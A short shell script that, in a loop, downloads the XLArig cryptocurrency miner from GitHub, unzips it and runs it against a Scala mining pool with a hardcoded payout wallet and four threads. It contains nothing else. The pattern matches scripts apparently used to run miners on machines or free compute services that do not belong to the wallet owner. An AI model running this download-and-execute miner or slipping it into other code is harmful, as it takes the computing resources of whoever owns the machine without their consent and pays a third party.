#!/bin/sh

COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o scala.herominers.com:10131 -u Ssy2CNw8yUdV6BeS75vHod8V9ZYk1RZxnTveg8f4DTrjLJhqn8yfSdBJfvEyrDtc7gKWDmSiwyKttEbvZfjs6X1P2czySJrRn6 -p worke -a panthera -k -t4

     echo COUNTER $COUNTER
     let COUNTER-=1
done
